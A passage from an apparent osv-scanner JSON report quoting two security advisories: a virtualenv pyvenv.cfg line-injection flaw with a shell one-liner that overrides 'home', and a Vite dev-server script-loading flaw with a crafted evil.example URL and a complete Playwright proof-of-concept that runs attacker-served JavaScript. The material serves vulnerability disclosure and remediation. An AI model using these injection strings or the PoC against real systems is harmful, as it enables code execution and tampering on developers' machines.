              "fullDescription": {
                "markdown": "`pyvenv.cfg` is a line-based format with no escape syntax. `PyEnvCfg.write()`\nwrote values verbatim, while `PyEnvCfg._read_values()` parses the file with\n`str.splitlines()`. A value containing a line boundary therefore became\nadditional configuration lines, and because reading is last-wins, the injected\nkeys replaced any key written earlier in the file.\n\nThe `prompt` value is the reachable input: it is set by `--prompt`, by the\n`VIRTUALENV_PROMPT` environment variable, or from the config file, and\n`write()` emits `prompt` before `home`. A crafted prompt can therefore set\n`home` in the generated `pyvenv.cfg`. `home` is what tooling reads to locate\nthe base interpreter, so a consumer that trusts it can be pointed elsewhere.\n`implementation`, `version_info`, `version`, `executable`, `command` and\n`virtualenv` are also written before `prompt` and can be replaced the same\nway.\n\nThis requires the prompt to come from somewhere other than the person running\nthe command, for example a CI job templating a branch name into it, tooling\nderiving an environment name from user-supplied data, or an inherited\n`VIRTUALENV_PROMPT`.\n\nThe boundary set is the one `str.splitlines()` recognizes, which is wider than\n`\\n`: `\\r`, `\\v`, `\\f`, the file, group and record separators, `U+0085`,\n`U+2028` and `U+2029` were all written through unchanged and all split the\nline when read back.\n\nFixed in 21.7.11: `PyEnvCfg.write()` now collapses those boundaries to spaces\nas it serializes each line, so it cannot emit a structurally invalid file\nregardless of what a caller places in `content`.\n",
                "text": "`pyvenv.cfg` is a line-based format with no escape syntax. `PyEnvCfg.write()`\nwrote values verbatim, while `PyEnvCfg._read_values()` parses the file with\n`str.splitlines()`. A value containing a line boundary therefore became\nadditional configuration lines, and because reading is last-wins, the injected\nkeys replaced any key written earlier in the file.\n\nThe `prompt` value is the reachable input: it is set by `--prompt`, by the\n`VIRTUALENV_PROMPT` environment variable, or from the config file, and\n`write()` emits `prompt` before `home`. A crafted prompt can therefore set\n`home` in the generated `pyvenv.cfg`. `home` is what tooling reads to locate\nthe base interpreter, so a consumer that trusts it can be pointed elsewhere.\n`implementation`, `version_info`, `version`, `executable`, `command` and\n`virtualenv` are also written before `prompt` and can be replaced the same\nway.\n\nThis requires the prompt to come from somewhere other than the person running\nthe command, for example a CI job templating a branch name into it, tooling\nderiving an environment name from user-supplied data, or an inherited\n`VIRTUALENV_PROMPT`.\n\nThe boundary set is the one `str.splitlines()` recognizes, which is wider than\n`\\n`: `\\r`, `\\v`, `\\f`, the file, group and record separators, `U+0085`,\n`U+2028` and `U+2029` were all written through unchanged and all split the\nline when read back.\n\nFixed in 21.7.11: `PyEnvCfg.write()` now collapses those boundaries to spaces\nas it serializes each line, so it cannot emit a structurally invalid file\nregardless of what a caller places in `content`.\n"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-102938](https://osv.dev/CVE-2026-102938)**\n(Also published as: [PYSEC-2026-4012](https://osv.dev/PYSEC-2026-4012), [GHSA-9h9j-4vrj-gf7g](https://osv.dev/GHSA-9h9j-4vrj-gf7g), ).\n\n## [PYSEC-2026-4012](https://osv.dev/PYSEC-2026-4012)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e `pyvenv.cfg` is a line-based format with no escape syntax. `PyEnvCfg.write()`\n\u003e wrote values verbatim, while `PyEnvCfg._read_values()` parses the file with\n\u003e `str.splitlines()`. A value containing a line boundary therefore became\n\u003e additional configuration lines, and because reading is last-wins, the injected\n\u003e keys replaced any key written earlier in the file.\n\u003e \n\u003e The `prompt` value is the reachable input: it is set by `--prompt`, by the\n\u003e `VIRTUALENV_PROMPT` environment variable, or from the config file, and\n\u003e `write()` emits `prompt` before `home`. A crafted prompt can therefore set\n\u003e `home` in the generated `pyvenv.cfg`. `home` is what tooling reads to locate\n\u003e the base interpreter, so a consumer that trusts it can be pointed elsewhere.\n\u003e `implementation`, `version_info`, `version`, `executable`, `command` and\n\u003e `virtualenv` are also written before `prompt` and can be replaced the same\n\u003e way.\n\u003e \n\u003e This requires the prompt to come from somewhere other than the person running\n\u003e the command, for example a CI job templating a branch name into it, tooling\n\u003e deriving an environment name from user-supplied data, or an inherited\n\u003e `VIRTUALENV_PROMPT`.\n\u003e \n\u003e The boundary set is the one `str.splitlines()` recognizes, which is wider than\n\u003e `\\n`: `\\r`, `\\v`, `\\f`, the file, group and record separators, `U+0085`,\n\u003e `U+2028` and `U+2029` were all written through unchanged and all split the\n\u003e line when read back.\n\u003e \n\u003e Fixed in 21.7.11: `PyEnvCfg.write()` now collapses those boundaries to spaces\n\u003e as it serializes each line, so it cannot emit a structurally invalid file\n\u003e regardless of what a caller places in `content`.\n\u003e \n\n\u003c/details\u003e\n\n## [GHSA-9h9j-4vrj-gf7g](https://osv.dev/GHSA-9h9j-4vrj-gf7g)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `pyvenv.cfg` is a line-based format with no escape syntax. `PyEnvCfg.write()` wrote values verbatim, while `PyEnvCfg._read_values()` parses the file with `str.splitlines()`. A value containing a line boundary therefore became additional configuration lines, and because reading is last-wins, the injected keys replaced any key written earlier in the file.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e The `prompt` value is the reachable input: it is set by `--prompt`, by the `VIRTUALENV_PROMPT` environment variable, or from the config file, and `write()` emits `prompt` before `home`. A crafted prompt can therefore set `home` in the generated `pyvenv.cfg`:\n\u003e \n\u003e ```console\n\u003e $ virtualenv --prompt $'x\"\\nhome = /attacker/path\\nprompt = \"z' venv\n\u003e $ grep '^home' venv/pyvenv.cfg\n\u003e home = /attacker/path\n\u003e ```\n\u003e \n\u003e `home` is what tooling reads to locate the base interpreter, so a consumer that trusts it can be pointed elsewhere. `implementation`, `version_info`, `version`, `executable`, `command` and `virtualenv` are also written before `prompt` and can be replaced the same way.\n\u003e \n\u003e This requires the prompt to come from somewhere other than the person running the command, for example a CI job templating a branch name into it, tooling deriving an environment name from user-supplied data, or an inherited `VIRTUALENV_PROMPT`. Where the operator supplies the prompt directly they already control the command line, and the effect is corruption rather than privilege gain: the value is truncated at the boundary and read back with a dangling quote.\n\u003e \n\u003e ### Details\n\u003e \n\u003e The boundary set is the one `str.splitlines()` recognizes, which is wider than `\\n`: `\\r`, `\\v`, `\\f`, the file, group and record separators, `U+0085`, `U+2028` and `U+2029` were all written through unchanged and all split the line when read back.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e `PyEnvCfg.write()` now collapses those boundaries to spaces as it serializes each line, so it cannot emit a structurally invalid file regardless of what a caller places in `content`.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Do not pass externally influenced data as the virtualenv prompt. Strip line boundaries from any value before using it as `--prompt` or `VIRTUALENV_PROMPT`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-9h9j-4vrj-gf7g | virtualenv | 21.7.11 |\n| PYSEC-2026-4012 | virtualenv | 21.7.11 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102938\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102938\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-102938](https://osv.dev/CVE-2026-102938)**\n(Also published as: [PYSEC-2026-4012](https://osv.dev/PYSEC-2026-4012), [GHSA-9h9j-4vrj-gf7g](https://osv.dev/GHSA-9h9j-4vrj-gf7g), ).\n\n## [PYSEC-2026-4012](https://osv.dev/PYSEC-2026-4012)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e `pyvenv.cfg` is a line-based format with no escape syntax. `PyEnvCfg.write()`\n\u003e wrote values verbatim, while `PyEnvCfg._read_values()` parses the file with\n\u003e `str.splitlines()`. A value containing a line boundary therefore became\n\u003e additional configuration lines, and because reading is last-wins, the injected\n\u003e keys replaced any key written earlier in the file.\n\u003e \n\u003e The `prompt` value is the reachable input: it is set by `--prompt`, by the\n\u003e `VIRTUALENV_PROMPT` environment variable, or from the config file, and\n\u003e `write()` emits `prompt` before `home`. A crafted prompt can therefore set\n\u003e `home` in the generated `pyvenv.cfg`. `home` is what tooling reads to locate\n\u003e the base interpreter, so a consumer that trusts it can be pointed elsewhere.\n\u003e `implementation`, `version_info`, `version`, `executable`, `command` and\n\u003e `virtualenv` are also written before `prompt` and can be replaced the same\n\u003e way.\n\u003e \n\u003e This requires the prompt to come from somewhere other than the person running\n\u003e the command, for example a CI job templating a branch name into it, tooling\n\u003e deriving an environment name from user-supplied data, or an inherited\n\u003e `VIRTUALENV_PROMPT`.\n\u003e \n\u003e The boundary set is the one `str.splitlines()` recognizes, which is wider than\n\u003e `\\n`: `\\r`, `\\v`, `\\f`, the file, group and record separators, `U+0085`,\n\u003e `U+2028` and `U+2029` were all written through unchanged and all split the\n\u003e line when read back.\n\u003e \n\u003e Fixed in 21.7.11: `PyEnvCfg.write()` now collapses those boundaries to spaces\n\u003e as it serializes each line, so it cannot emit a structurally invalid file\n\u003e regardless of what a caller places in `content`.\n\u003e \n\n\u003c/details\u003e\n\n## [GHSA-9h9j-4vrj-gf7g](https://osv.dev/GHSA-9h9j-4vrj-gf7g)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `pyvenv.cfg` is a line-based format with no escape syntax. `PyEnvCfg.write()` wrote values verbatim, while `PyEnvCfg._read_values()` parses the file with `str.splitlines()`. A value containing a line boundary therefore became additional configuration lines, and because reading is last-wins, the injected keys replaced any key written earlier in the file.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e The `prompt` value is the reachable input: it is set by `--prompt`, by the `VIRTUALENV_PROMPT` environment variable, or from the config file, and `write()` emits `prompt` before `home`. A crafted prompt can therefore set `home` in the generated `pyvenv.cfg`:\n\u003e \n\u003e ```console\n\u003e $ virtualenv --prompt $'x\"\\nhome = /attacker/path\\nprompt = \"z' venv\n\u003e $ grep '^home' venv/pyvenv.cfg\n\u003e home = /attacker/path\n\u003e ```\n\u003e \n\u003e `home` is what tooling reads to locate the base interpreter, so a consumer that trusts it can be pointed elsewhere. `implementation`, `version_info`, `version`, `executable`, `command` and `virtualenv` are also written before `prompt` and can be replaced the same way.\n\u003e \n\u003e This requires the prompt to come from somewhere other than the person running the command, for example a CI job templating a branch name into it, tooling deriving an environment name from user-supplied data, or an inherited `VIRTUALENV_PROMPT`. Where the operator supplies the prompt directly they already control the command line, and the effect is corruption rather than privilege gain: the value is truncated at the boundary and read back with a dangling quote.\n\u003e \n\u003e ### Details\n\u003e \n\u003e The boundary set is the one `str.splitlines()` recognizes, which is wider than `\\n`: `\\r`, `\\v`, `\\f`, the file, group and record separators, `U+0085`, `U+2028` and `U+2029` were all written through unchanged and all split the line when read back.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e `PyEnvCfg.write()` now collapses those boundaries to spaces as it serializes each line, so it cannot emit a structurally invalid file regardless of what a caller places in `content`.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Do not pass externally influenced data as the virtualenv prompt. Strip line boundaries from any value before using it as `--prompt` or `VIRTUALENV_PROMPT`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-9h9j-4vrj-gf7g | virtualenv | 21.7.11 |\n| PYSEC-2026-4012 | virtualenv | 21.7.11 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102938\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102938\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-102938",
              "name": "CVE-2026-102938",
              "properties": {
                "security-severity": "5.8"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-102938: virtualenv writes prompt values into pyvenv.cfg without sanitizing line boundaries, allowing configuration injection",
                "text": "CVE-2026-102938: virtualenv writes prompt values into pyvenv.cfg without sanitizing line boundaries, allowing configuration injection"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-112945",
                "GHSA-9jrq-w75r-8gcw"
              ],
              "fullDescription": {
                "markdown": "### Summary\n\nWhen accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n- the transformed HTML contains an inline module script\n- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\n### Details\n\n[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\n```js\nconst url = req.originalUrl\ntemplate = await vite.transformIndexHtml(url, template)\n```\n\nFor a development server at `http://localhost:5173`, an attacker can send this URL:\n\n```text\nhttp://localhost:5173//evil.example/payload.js?/../../package.json\n```\n\nIn Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\nChromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\n[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\n```html\n\u003cscript type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy\u0026index=0.js\"\u003e\u003c/script\u003e\n```\n\nThe generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\n### PoC\n\n```js\nimport { createServer as createHttpServer } from 'node:http'\nimport { createRequire } from 'node:module'\nimport { dirname, join } from 'node:path'\nimport { fileURLToPath, pathToFileURL } from 'node:url'\n\nconst directory = dirname(fileURLToPath(import.meta.url))\nconst require = createRequire(join(directory, 'package.json'))\nconst { chromium } = require('playwright-chromium')\nconst viteModule = await import(\n  pathToFileURL(require.resolve('vite')).href\n)\nconst createViteServer =\n  viteModule.createServer ?? viteModule.default.createServer\n\n// This loopback server stands in for a separately hosted attacker website.\nconst attackerPort = 4173\nconst exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\nconst html = '\u003cscript type=\"module\"\u003edocument.body.textContent = \"Vite app\"\u003c/script\u003e'\n\nconst listen = (server, port = 0) =\u003e\n  new Promise((resolve, reject) =\u003e {\n    server.once('error', reject)\n    server.listen(port, '127.0.0.1', () =\u003e {\n      server.off('error', reject)\n      resolve(server.address().port)\n    })\n  })\n\nconst close = (server) =\u003e\n  new Promise((resolve, reject) =\u003e {\n    server.close((error) =\u003e (error ? reject(error) : resolve()))\n  })\n\nlet attackerRequest = null\nconst attacker = createHttpServer((request, response) =\u003e {\n  attackerRequest = request.url\n  response.writeHead(200, {\n    'access-control-allow-origin': '*',\n    'content-type': 'text/javascript',\n  })\n  response.end(\n    \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n  )\n})\n\nconst vite = await createViteServer({\n  appType: 'custom',\n  configFile: false,\n  root: directory,\n  server: {\n    hmr: false,\n    middlewareMode: true,\n    watch: null,\n  },\n})\n\nconst application = createHttpServer((request, response) =\u003e {\n  vite.middlewares(request, response, async (error) =\u003e {\n    if (error) {\n      response.destroy(error)\n      return\n    }\n\n    try {\n      const transformed = await vite.transformIndexHtml(request.url, html)\n      response.writeHead(200, { 'content-type': 'text/html' })\n      response.end(transformed)\n    } catch (transformError) {\n      response.destroy(transformError)\n    }\n  })\n})\n\nawait listen(attacker, attackerPort)\nconst applicationPort = await listen(application)\nconst browser = await chromium.launch({ headless: true })\n\ntry {\n  const page = await browser.newPage()\n  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n  await page.waitForFunction(\n    () =\u003e document.documentElement.dataset.viteXssPoc === 'executed',\n  )\n\n  console.log(`attacker request: ${attackerRequest}`)\n  console.log('JavaScript from the attacker server executed in the Vite page')\n} finally {\n  await browser.close()\n  await close(application)\n  await vite.close()\n  await close(attacker)\n}\n```\n\nObserved output on Vite 8.2.1:\n```text\nattacker request: /payload.js?/../../package.json?html-proxy\u0026index=0.js\nJavaScript from the attacker server executed in the Vite page\n```",
                "text": "### Summary\n\nWhen accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n- the transformed HTML contains an inline module script\n- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\n### Details\n\n[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\n```js\nconst url = req.originalUrl\ntemplate = await vite.transformIndexHtml(url, template)\n```\n\nFor a development server at `http://localhost:5173`, an attacker can send this URL:\n\n```text\nhttp://localhost:5173//evil.example/payload.js?/../../package.json\n```\n\nIn Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\nChromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\n[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\n```html\n\u003cscript type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy\u0026index=0.js\"\u003e\u003c/script\u003e\n```\n\nThe generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\n### PoC\n\n```js\nimport { createServer as createHttpServer } from 'node:http'\nimport { createRequire } from 'node:module'\nimport { dirname, join } from 'node:path'\nimport { fileURLToPath, pathToFileURL } from 'node:url'\n\nconst directory = dirname(fileURLToPath(import.meta.url))\nconst require = createRequire(join(directory, 'package.json'))\nconst { chromium } = require('playwright-chromium')\nconst viteModule = await import(\n  pathToFileURL(require.resolve('vite')).href\n)\nconst createViteServer =\n  viteModule.createServer ?? viteModule.default.createServer\n\n// This loopback server stands in for a separately hosted attacker website.\nconst attackerPort = 4173\nconst exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\nconst html = '\u003cscript type=\"module\"\u003edocument.body.textContent = \"Vite app\"\u003c/script\u003e'\n\nconst listen = (server, port = 0) =\u003e\n  new Promise((resolve, reject) =\u003e {\n    server.once('error', reject)\n    server.listen(port, '127.0.0.1', () =\u003e {\n      server.off('error', reject)\n      resolve(server.address().port)\n    })\n  })\n\nconst close = (server) =\u003e\n  new Promise((resolve, reject) =\u003e {\n    server.close((error) =\u003e (error ? reject(error) : resolve()))\n  })\n\nlet attackerRequest = null\nconst attacker = createHttpServer((request, response) =\u003e {\n  attackerRequest = request.url\n  response.writeHead(200, {\n    'access-control-allow-origin': '*',\n    'content-type': 'text/javascript',\n  })\n  response.end(\n    \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n  )\n})\n\nconst vite = await createViteServer({\n  appType: 'custom',\n  configFile: false,\n  root: directory,\n  server: {\n    hmr: false,\n    middlewareMode: true,\n    watch: null,\n  },\n})\n\nconst application = createHttpServer((request, response) =\u003e {\n  vite.middlewares(request, response, async (error) =\u003e {\n    if (error) {\n      response.destroy(error)\n      return\n    }\n\n    try {\n      const transformed = await vite.transformIndexHtml(request.url, html)\n      response.writeHead(200, { 'content-type': 'text/html' })\n      response.end(transformed)\n    } catch (transformError) {\n      response.destroy(transformError)\n    }\n  })\n})\n\nawait listen(attacker, attackerPort)\nconst applicationPort = await listen(application)\nconst browser = await chromium.launch({ headless: true })\n\ntry {\n  const page = await browser.newPage()\n  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n  await page.waitForFunction(\n    () =\u003e document.documentElement.dataset.viteXssPoc === 'executed',\n  )\n\n  console.log(`attacker request: ${attackerRequest}`)\n  console.log('JavaScript from the attacker server executed in the Vite page')\n} finally {\n  await browser.close()\n  await close(application)\n  await vite.close()\n  await close(attacker)\n}\n```\n\nObserved output on Vite 8.2.1:\n```text\nattacker request: /payload.js?/../../package.json?html-proxy\u0026index=0.js\nJavaScript from the attacker server executed in the Vite page\n```"
